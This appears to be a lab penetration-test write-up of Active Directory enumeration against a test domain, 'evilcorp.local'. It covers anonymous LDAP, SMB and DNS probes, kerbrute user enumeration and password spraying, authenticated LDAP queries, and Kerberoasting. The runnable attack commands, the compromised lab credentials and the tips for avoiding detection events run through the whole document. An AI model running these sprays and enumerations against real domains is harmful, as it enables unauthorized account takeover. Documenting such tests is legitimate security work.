# 02 — Active Directory Enumeration

**Date:** 29–31/05/2026  
**Tester:** Alessandro Moreschi  
**Target:** `10.10.10.5` — Domain Controller `evilcorp.local`  
**Starting condition:** Zero credentials

---

## Objective

Enumerate the Active Directory environment — first anonymously, then with recovered credentials — to map users, groups, computers and identify attack paths.

---

## Phase 1 — Anonymous Enumeration Attempts

### Test 1 — LDAP RootDSE (no credentials required)

```bash
sudo nmap -Pn -p 389 --script ldap-rootdse 10.10.10.5 \
  -oN ~/pentest_evilcorp/scans/10.10.10.5_ldap_rootdse.txt
```

**Why:** RootDSE is publicly accessible on AD — it exposes structural information about the domain without requiring authentication.

**Results:**

| Property | Value |
|---|---|
| Domain | `evilcorp.local` |
| Domain Controller | `WIN-6RI3NLJ1Q7G.evilcorp.local` |
| AD Site | `Milan-HQ` |
| Global Catalog | `TRUE` |
| Synchronized | `TRUE` |
| Domain Functionality | 7 (Windows Server 2016+) |

**Conclusion:** Domain structure confirmed. `DC=evilcorp,DC=local` is the base naming context for future LDAP queries.

---

### Test 2 — Anonymous LDAP read on naming context

```bash
ldapsearch -x -H ldap://10.10.10.5 \
  -b "DC=evilcorp,DC=local" \
  -s base "(objectClass=*)" \
  distinguishedName name objectClass
```

**Result:** `Operations error — successful bind must be completed first`

**Conclusion:** Anonymous enumeration of domain objects via LDAP is **blocked**. Authentication required.

---

### Test 3 — Anonymous SMB session (null session)

```bash
smbclient -L //10.10.10.5 -N
```

**Result:** `NT_STATUS_ACCESS_DENIED`

**Conclusion:** Null SMB session blocked. Share enumeration not possible without credentials.

---

### Test 4 — DNS Zone Transfer

```bash
dig @10.10.10.5 evilcorp.local AXFR
```

**Result:** `Transfer failed`

**Conclusion:** DNS zone transfer not permitted from unauthorized hosts.

---

### Anonymous enumeration summary

| Vector | Result |
|---|---|
| LDAP RootDSE | ✅ Accessible — domain structure exposed |
| LDAP objects | ❌ Blocked — requires authentication |
| SMB null session | ❌ Blocked |
| DNS zone transfer | ❌ Blocked |

The DC is reasonably hardened against anonymous enumeration. However, Kerberos user enumeration does **not** require credentials and does **not** generate Event ID 4625 (failed logon).

---

## Phase 2 — User Enumeration via Kerberos (no credentials)

### Command

```bash
/usr/local/bin/kerbrute userenum /tmp/userlist.txt \
  -d evilcorp.local --dc 10.10.10.5
```

**Why:** Kerbrute sends AS-REQ packets to the KDC — valid usernames receive a different error response than invalid ones. This technique generates **no 4625 events**, making it stealthy.

### Results — 6 valid users identified (out of 15 tested)

| Username | Type | Notes |
|---|---|---|
| `administrator` | Privileged | Built-in admin account |
| `helpdesk` | Service | IT helpdesk account |
| `lbianchi` | Standard | HR department |
| `mrossi` | Standard | HR department |
| `a-ale` | **Admin** | Prefix `a-` suggests Tier Model admin account |
| `sqlsvc` | Service | SPN likely present — **Kerberoasting candidate** |

**Key observations:**
- `a-ale` naming convention indicates a **dedicated admin account** (Tier Model separation)
- `sqlsvc` is a service account — likely has a registered SPN → Kerberoasting target
- 6 valid users discovered **with zero credentials and zero noise**

---

## Phase 3 — Password Spraying (single password, all users)

### Round 1 — `Password01!`

```bash
kerbrute passwordspray /tmp/userlist.txt 'Password01!' \
  -d evilcorp.local --dc 10.10.10.5
```

**Why:** One password per user avoids account lockout policies.

**Result:** `mrossi : Password01!` ✅

**Impact:** Domain user access obtained. `mrossi` is a standard HR account.

---

### Phase 3b — Authenticated enumeration with `mrossi`

#### SMB enumeration attempt

```bash
crackmapexec smb 10.10.10.5 -u mrossi -p 'Password01!' --users
```

**Result:** Access denied — SMB user enumeration blocked for standard users.

#### LDAP authenticated query

```bash
ldapsearch -x -H ldap://10.10.10.5 \
  -D 'mrossi@evilcorp.local' -w 'Password01!' \
  -b 'DC=evilcorp,DC=local' \
  '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName
```

**Result — full domain object list obtained:**

**User accounts:**

| Account | Notes |
|---|---|
| `Administrator` | Built-in privileged account |
| `Guest` | Guest account |
| `krbtgt` | Kerberos account — hash useful for Golden Ticket |
| `lbianchi` | HR user |
| `gverdi` | Standard user — not found by kerbrute |
| `itsupport` | IT support account |
| `backup.admin` | ⚠️ Backup account — possible SeBackupPrivilege |
| `helpdesk` | Helpdesk |
| `helpdesk2` | Second helpdesk account |
| `a-ale` | Dedicated admin account (Tier Model) |
| `mrossi` | Current user |
| `sqlsvc` | Service account with SPN |
| `hd-admin` | Local admin account |

**Computer accounts:**

| Account | Role |
|---|---|
| `WIN-6RI3NLJ1Q7G$` | DC01 |
| `DESKTOP-N39ROJ3$` | CLIENT01 |
| `DC02$` | DC02 |
| `WIN-DHVB4B3K5MV$` | Azure AD Connect VM |
| `MSOL_5069fb6c931f` | ⚠️ Azure AD Connect sync account |

**High-value targets identified:**

1. **`backup.admin`** — naming suggests backup operator role, possible `SeBackupPrivilege`
2. **`MSOL_5069fb6c931f`** — Azure AD Connect account; often granted DCSync rights via ACL on domain root (not via group membership)
3. **`sqlsvc`** — service account with likely SPN → Kerberoasting

---

## Phase 4 — Kerberoasting

```bash
impacket-GetUserSPNs evilcorp.local/mrossi:'Password01!' \
  -dc-ip 10.10.10.5 -request
```

**Result:**
- `sqlsvc` → SPN: `MSSQLSvc/dc01.evilcorp.local:1433`
- TGS hash extracted: `$krb5tgs$23$*sqlsvc*...`
- ⚠️ `sqlsvc` is in **Protected Users** group → AES encryption enforced → offline crack extremely difficult

Hash saved to `/tmp/kerberoast_sqlsvc.txt`.

---

## Phase 5 — Second Password Spray Round

### Round 2 — `backup.admin` targeted spray

```bash
# Passwords tested: backup, Backup2024, backup123, Admin2024, Password01!, Evilcorp2024
```

**Result:** No match on `backup.admin`.

### Round 3 — Company-themed password `Evilcorp!`

```bash
kerbrute passwordspray /tmp/userlist.txt 'Evilcorp!' \
  -d evilcorp.local --dc 10.10.10.5
```

**Result — 6 accounts compromised:**

| Account | Password | Impact |
|---|---|---|
| `gverdi` | `Evilcorp!` | Standard user |
| `backup.admin` | `Evilcorp!` | Backup operator |
| `helpdesk2` | `Evilcorp!` | Helpdesk |
| `itsupport` | `Evilcorp!` | IT support |
| `helpdesk` | `Evilcorp!` | Helpdesk |
| `a-ale` | `Evilcorp!` | ⚠️ **DOMAIN ADMIN** |

### 🔴 Critical Finding

The company-themed password `Evilcorp!` was shared across **6 accounts including a Domain Admin**.  
This represents **complete domain compromise**.

---

## Phase 6 — Domain Admin Access

### Initial attempt — NTLM blocked

```bash
crackmapexec smb 10.10.10.5 -u a-ale -p 'Evilcorp!'
```

**Result:** `STATUS_ACCOUNT_RESTRICTION`

**Analysis:** Valid credentials but NTLM authentication blocked — `a-ale` is in the **Protected Users** group. NTLM is disabled for this account by design.

**Next step:** Use Kerberos authentication instead of NTLM.

→ Domain Admin access achieved. Full domain compromise documented in [04-ad-compromise.md](./04-ad-compromise.md)

---

## Summary

| Phase | Technique | Result |
|---|---|---|
| Anonymous enumeration | LDAP, SMB, DNS | Blocked — DC hardened |
| User enumeration | Kerbrute (Kerberos) | 6 valid users — no noise |
| Initial access | Password spray `Password01!` | `mrossi` compromised |
| Authenticated recon | LDAP query | 17 objects enumerated |
| Kerberoasting | impacket-GetUserSPNs | Hash extracted (AES — hard to crack) |
| Escalation | Password spray `Evilcorp!` | **Domain Admin `a-ale` compromised** |
